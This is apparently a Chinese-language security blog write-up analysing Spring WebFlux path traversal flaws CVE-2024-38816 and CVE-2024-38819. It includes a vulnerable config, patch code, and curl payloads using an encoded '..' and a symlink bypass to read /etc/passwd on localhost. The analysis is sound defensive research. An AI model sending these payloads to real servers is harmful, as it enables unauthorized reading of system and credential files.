# CVE-2024-38816&amp;CVE-2024-38819

  
  
&lt;!--more--&gt;  
## 0x00 前言  
`Spring`通告  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502191925620.png)
根据描述，搭建环境  
`WebConfig`  
```java  
package org.example.demo;    
    
    
import org.springframework.context.annotation.Bean;    
import org.springframework.context.annotation.Configuration;    
import org.springframework.core.io.FileSystemResource;    
    
import org.springframework.web.reactive.function.server.RouterFunction;    
import org.springframework.web.reactive.function.server.RouterFunctions;    
import org.springframework.web.reactive.function.server.ServerResponse;    
    
    
    
@Configuration    
public class WebConfig {    
    
    @Bean    
    public RouterFunction&lt;ServerResponse&gt; route() {    
        return RouterFunctions    
                    .resources(&#34;/static/**&#34;, new FileSystemResource(&#34;/Users/f10wers13eicheng/&#34;));    
    
    }    
}  
```  
## 0x01 漏洞分析  
### CVE-2024-38816  
查阅网上的文章分析  
https://zhuanlan.zhihu.com/p/5483655619  
造成漏洞的根本原因是`org.springframework.web.reactive.function.server.PathResourceLookupFunction#apply`函数  
其中`processPath`函数会处理多余的`/`，但是我们这里进行了`URL`编码所以并没有去除，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502191929551.png)
在下面进行URL解码之后，进入到`isInvalidPath`函数进行检查  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502191931224.png)
其中进入到`StringUtils.cleanPath`函数，`delimitedListToStringArray`函数会把我们传入的`//`也会解析成空  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502191933303.png)
在下面添加元素时，同样也会解析当前目录和上一级目录，同时因为我们的空元素会  
进行`top--`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502191949521.png)
在`for`循环处无法添加到`..`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502191950105.png)
导致无法检查到`..`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502191937490.png)
进行读取文件  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502191938255.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502191951906.png)
### CVE-2024-38819 &amp;&amp; CVE-2024-38819 Bypass  
`6.1.14`在`6.1.13`的基础上在`processPath`函数处，新加了一个`normailizePath`函数  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502192020959.png)
```java  
private static String normalizePath(String path) {    
    String result = path;    
    if (result.contains(&#34;%&#34;)) {    
       result = decode(result);    
       if (result.contains(&#34;%&#34;)) {    
          result = decode(result);    
       }    
       if (result.contains(&#34;../&#34;)) {    
          return StringUtils.cleanPath(result);    
       }    
    }    
    return path;    
}  
```  
这个漏洞没有什么好说的，  
POC  
https://github.com/masa42/CVE-2024-38819-POC  
利用了软链接进行绕过，但是在下一个版本修复中仅仅修复了`../`  
所以我们还是可以进行绕过的，  
`payload`  
```bash  
ln -s /static /app/static/link  
curl http://localhost:8889/static/link/%2e%2e/etc/passwd  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502201052439.png)
绕过`payload`  
```bash  
ln -s / /app/static/link  
curl http://localhost:8889/static/link/etc/passwd  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502201054067.png)
`Orz`但是我将绕过后的`payload`提交了`issue`，开发者告诉我这并不属于漏洞  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502201055289.png)
不知道`CVE-2024-38819`究竟是怎么提交成功的，可能是他们只认为payload中存在`../`才属于漏洞  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/cve-2024-38816cve-2024-38819/  

